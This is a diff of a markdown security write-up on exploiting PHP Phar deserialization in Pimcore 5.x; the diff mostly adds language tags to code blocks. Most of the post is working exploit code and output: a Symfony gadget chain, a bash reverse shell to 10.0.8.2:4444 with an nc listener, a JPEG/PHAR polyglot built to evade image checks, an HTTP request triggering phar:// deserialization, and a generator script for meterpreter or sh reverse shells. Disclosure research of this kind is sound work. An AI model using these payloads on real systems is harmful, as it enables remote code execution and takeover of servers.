@@ -47,8 +47,7 @@ A full description of the Phar file format is beyond the scope of this post, how
 * **Meta-data**: (optional) The metadata may contain any serialized PHP object represented in the standard PHP format.
 
 Let's create a Phar file and add an object with some data as meta data:
-
-```
+```php
 <?php
   // a generic object class
   class TestObject {}
@@ -78,7 +77,7 @@ Our newly created `test.phar` file now has the following content. We can see tha
 If a file operation is now performed on our existing Phar file via the `phar://` wrapper, then its serialized meta data is **unserialized**. This means that our injected object in the meta data is loaded into the application’s scope. If this application has a class named TestObject and it has the magic method `__destruct()` or `__wakeup()` defined, then those methods are automatically invoked. This means we can trigger any destructor or wakeup method in the code base. Even worse, if these methods operate on our injected data then this can lead to further vulnerabilities.
 
 Pimcore version 5.x is based on Symfony. In order to trigger a destruct method we can use a Symfony gadget chain like the following:
-```
+```php
 namespace Symfony\Component\Cache\Traits
 {
     use \Psr\Log\LoggerAwareTrait;
@@ -122,7 +121,7 @@ namespace Symfony\Component\Cache\Adapter
 }
 ```
 We can define any kind of shell script as payload than create the serialized object:
-```
+```php
 $payload = "bash -i >& /dev/tcp/10.0.8.2/4444 0>&1"; // Simple Bash reverse shell, on attacker side: 'nc -l -p 4444'
 $o = new \Symfony\Component\Cache\Adapter\ApcuAdapter($payload);
 ```
@@ -144,7 +143,7 @@ First of all, Phar files are extension independend. If the `evil.phar` file was 
 Then, there are three base formats in which the data within a Phar archive can be stored; Phar, Zip and Tar. Each of which offers different types and degrees of flexibility. The Phar format allows us complete control of the start of a file. This minimal stub may be prefixed with any arbitrary data, and is the first thing in the file. According to the documentation *there are no restrictions on the contents of a Phar stub, except for the requirement that it conclude with \_\_HALT_COMPILER();*. 
 
 Than we can start the stub with the JPEG file header. Our script become something like this (where `\xFF\xD8\xFF\xFE\x13\xFA\x78\x74` is the hex view of the header of the JPEG file format):
-```
+```php
 <?php
   // a generic object class
   class TestObject {}
@@ -168,7 +167,7 @@ Than we can start the stub with the JPEG file header. Our script become somethin
 ?>
 ```
 Will it be a valid PHAR and JPEG image?
-```
+```bash
 root@kali:~# file test.jpg 
 test.jpg: JPEG image data
 root@kali:~# php -a
@@ -185,7 +184,7 @@ PHP recognizes it as an image **and** we can still explore the contents of the a
 #### The next level
 
 We have a file that would pass any check based on file headers, however anything more sofisticate than that would fail. For example, checking the image with `getimagesize` will return false, since we do not have a "real" image:
-```
+```bash
 root@kali:~# php -a
 Interactive mode enabled
 
@@ -196,7 +195,7 @@ php >
 But wait, we saw that we can inject as much gibberish we want before the `__HALT_COMPILER()` token. What if we craft a full image?
 
 Can we simply create a 1x1 image with GIMP and embed it?
-```
+```php
 <?php
   // a generic object class
   class TestObject {}
@@ -245,7 +244,7 @@ Can we simply create a 1x1 image with GIMP and embed it?
 ?>
 ```
 Now, it's time to check it out:
-```
+```bash
 root@kali:~# file test.jpg 
 test.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 300x300, segment length 16, comment: "Created by Fabio Cogno", progressive, precision 8, 1x1, components 3
 root@kali:~# php -a
@@ -283,7 +282,7 @@ Now we can download an existing asset in Pimcore, make it also a Phar file with 
 The last step of exploiting the Phar deserialization is finding a way to include our JPEG/PHAR file with the `phar://` wrapper in any PHP file function.
 
 Fortunately, the bulk-commit function take a parameter called "filename" with the following code (pimcore/bundles/AdminBundle/Controller/Admin/DataObject/ClassController.php):
-```
+```php
 public function bulkCommitAction(Request $request)
     {
         $filename = $request->get('filename');
@@ -293,7 +292,7 @@ public function bulkCommitAction(Request $request)
         ...
 ```
 Perfect! We can call the bulk-commit with our JPEG/PHAR in the `phar://` wrapper:
-```
+```http
 POST /admin/class/bulk-commit HTTP/1.1
 Host: 192.168.2.59:8566
 X-pimcore-csrf-token: 9e7b89690abdd2515b3dafbb721c7a98f8d153c3
@@ -312,7 +311,7 @@ By default the script generate a 1x1 JPEG but you can pass any JPEG image for a 
 
 Moreover, the script generate a basic *sh reverse shell*, a metasploit *PHP meterpreter reverse shell* or whatever command you want.
 
-```
+```bash
 root@kali:~# php polyglot_phar_exploit.php -h
 This PHP CLI script create a polyglot PHAR (PHP Archive) that is a valid PHAR file and JPEG image at the same time.
 The PHAR file contain a Symfony gadget chain in his meta data and exploit __destruct() method executing the passed command.
